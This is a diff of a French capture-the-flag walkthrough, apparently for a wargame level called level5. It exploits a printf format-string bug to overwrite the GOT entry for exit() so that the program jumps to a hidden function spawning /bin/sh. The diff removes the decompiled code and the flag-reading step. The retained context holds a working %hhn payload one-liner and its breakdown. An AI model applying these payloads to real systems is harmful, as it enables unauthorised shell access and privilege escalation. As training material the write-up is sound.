@@ -6,27 +6,6 @@ Mais contrairement à level4, il n'y a **pas de condition à satisfaire** : le p
 fait `exit(1)` juste après. Le but est de **détourner cet `exit`** pour qu'il saute
 dans la fonction cachée `o()` qui lance `system("/bin/sh")`.
 
-## Le code (Ghidra)
-
-```c
-void main(void) {
-    n();
-    return;
-}
-
-void n(void) {
-    char local_20c [520];
-    fgets(local_20c, 0x200, stdin);  // 512 octets max -> CONTRAINTE IMPORTANTE
-    printf(local_20c);               // <-- faille format string
-    exit(1);                         // <-- on va détourner cet exit
-}
-
-void o(void) {                       // jamais appelée par le programme !
-    system("/bin/sh");               // <-- le trésor
-    _exit(1);
-}
-```
-
 ## Le nouveau concept : GOT overwrite (réécriture du carnet d'adresses)
 
 ### C'est quoi la GOT ?
@@ -169,17 +148,7 @@ python -c 'print "\x3a\x98\x04\x08\x3b\x98\x04\x08\x39\x98\x04\x08\x38\x98\x04\x
 (python -c 'print "\x3a\x98\x04\x08\x3b\x98\x04\x08\x39\x98\x04\x08\x38\x98\x04\x08" + "a"*244 + "%4$hhn" + "a"*4 + "%5$hhn" + "a"*124 + "%6$hhn" + "a"*32 + "%7$hhn"'; cat) | ./level5
 ```
 
-Le `cat` final (sans argument) relit le clavier → permet de taper des commandes dans
-le shell spawné. Sans lui, le shell s'ouvre et se referme aussitôt (stdin fermé).
 
-## Étape 7 : récupérer le flag
-
-Une fois le shell obtenu :
-
-```bash
-whoami              # doit répondre "level6"
-cat /home/user/level6/.pass
-```
 
 ## Décomposition du payload
 
@@ -198,18 +167,6 @@ cat /home/user/level6/.pass
 résultat : GOT[exit] = 0xa4 0x84 0x04 0x08 = 0x080484a4 = adresse de o()
 exit(1) → o() → system("/bin/sh") → shell level6 🎉
 ```
-
-## Piège rencontré : buffer trop petit pour %hn
-
-La première tentative utilisait `%hn` (2 octets à la fois = 2 écritures seulement).
-Mais les paddings nécessaires (~34 000 caractères) dépassaient la limite de `fgets`
-(512 octets) → les `%hn` n'étaient jamais lus → GOT non modifié → `exit` normal.
-
-Retour à `%hhn` (1 octet) : paddings max ~244 caractères → total ~444 octets → ✓.
-
-**Règle** : toujours vérifier que la taille totale du payload < limite de `fgets`.
-
-## Schémas du flow
 
 ### 1. Flow global de l'exploit
 
